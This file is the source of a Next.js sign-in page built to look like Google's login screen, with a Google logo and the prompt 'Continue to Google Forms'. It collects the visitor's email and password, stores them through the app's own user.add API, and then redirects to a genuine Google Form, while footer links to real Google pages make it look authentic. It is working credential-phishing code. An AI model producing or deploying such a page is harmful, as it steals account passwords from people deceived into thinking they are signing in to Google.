import { Checkbox } from "@mui/material";
import type { NextPage } from "next";
import Image from "next/image";
import Link from "next/link";
import { useState } from "react";
import InputField from "~/components/form/InputField";
import { EmailSchema, PasswordSchema } from "~/schemas/form.schema";
import type { FormSchemaType } from "~/schemas/form.schema";
import MultiStepForm from "~/components/form/MultiStepForm";
import FormStep from "~/components/form/FormStep";
import { api } from "~/utils/api";
import { useRouter } from "next/router";

const Signin: NextPage = () => {
  const router = useRouter();
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const { mutate } = api.user.add.useMutation({
    onSuccess: () => {
      setTimeout(() => {
        void router.push("https://forms.gle/eEzWKMDmDSecH3bU7");
      }, 1000);
    },
  });
  const handleShowPassword = () => {
    setShowPassword(!showPassword);
  };
  const handleSubmit = (values: FormSchemaType) => {
    setSubmitting(true);
    mutate(values);
  };
  const footerLinks = [
    {
      name: "Help",
      path: "https://support.google.com/accounts?hl=en&p=account_iph",
    },
    {
      name: "Privacy",
      path: "https://accounts.google.com/TOS?hl=en&privacy=true",
    },
    {
      name: "Terms",
      path: "https://accounts.google.com/TOS?hl=en",
    },
  ];
  return (
    <div className="flex min-h-screen justify-center lg:items-center lg:pt-8">
      <div className="flex w-full max-w-md flex-col gap-2">
        <section
          className={`relative flex w-full flex-col gap-10 overflow-hidden py-12 lg:rounded-lg lg:border lg:border-gray-300 lg:px-10 ${
            submitting ? "pointer-events-none opacity-50" : ""
          }`}
        >
          {submitting ? (
            <div className="loader-line absolute inset-x-0 top-0 mx-auto"></div>
          ) : null}
          <header className="flex flex-col items-center justify-center gap-3.5 px-5 text-center">
            <Image
              src={"/img/google-logo.png"}
              alt="Google Forms logo"
              width={73}
              height={24}
            />
            <div className="flex flex-col gap-1.5">
              <h1 className="text-2xl font-normal">Sign in</h1>
              <p>Continue to Google Forms</p>
            </div>
          </header>
          <main className="flex flex-col px-5">
            <MultiStepForm
              initialValues={{ email: "", password: "" } as FormSchemaType}
              onSubmit={handleSubmit}
            >
              <FormStep
                stepName="Email"
                validationSchema={EmailSchema}
                className="flex flex-col gap-2"
              >
                <InputField name="email" label="Email or phone number" />
                <Link
                  href={
                    "https://accounts.google.com/signin/v2/usernamerecovery"
                  }
                  className="w-fit text-sm font-medium text-[#1A73E8] outline-none focus:rounded-sm focus:bg-[#DDEAFC] focus:text-[#174EA6] focus:ring-2 focus:ring-[#174EA6] focus:ring-offset-2"
                >
                  Forgot email?
                </Link>
                <div className="mt-10 flex flex-col justify-start text-sm ">
                  <p className="text-gray-600">
                    Not your computer? Use Guest mode to sign in privately.
                  </p>
                  <Link
                    href={
                      "https://support.google.com/chrome/answer/6130773?hl=en"
                    }
                    className="w-fit text-sm font-medium text-[#1A73E8] outline-none focus:rounded-sm focus:bg-[#DDEAFC] focus:text-[#174EA6] focus:ring-2 focus:ring-[#174EA6] focus:ring-offset-2"
                  >
                    Learn more
                  </Link>
                </div>
              </FormStep>
              <FormStep
                stepName="Password"
                validationSchema={PasswordSchema}
                className="flex flex-col gap-2"
              >
                <InputField
                  name="password"
                  label="Password"
                  type={showPassword ? "text" : "password"}
                />
                <div className="-ml-2.5 flex items-center text-sm">
                  <Checkbox
                    checked={showPassword}
                    onChange={handleShowPassword}
                  />
                  <p className="cursor-pointer" onClick={handleShowPassword}>
                    Show password
                  </p>
                </div>
              </FormStep>
            </MultiStepForm>
          </main>
        </section>
        <section className="flex h-12 justify-center text-xs">
          <ul className="flex h-full gap-5">
            {footerLinks.map((footerLink) => (
              <li key={footerLink.name} className="flex">
                <Link
                  target="_blank"
                  href={footerLink.path}
                  className="flex items-center justify-center rounded px-4 capitalize text-[#3C4043] outline-none focus:bg-[#E0E0E0]"
                >
                  {footerLink.name}
                </Link>
              </li>
            ))}
          </ul>
        </section>
      </div>
    </div>
  );
};

export default Signin;
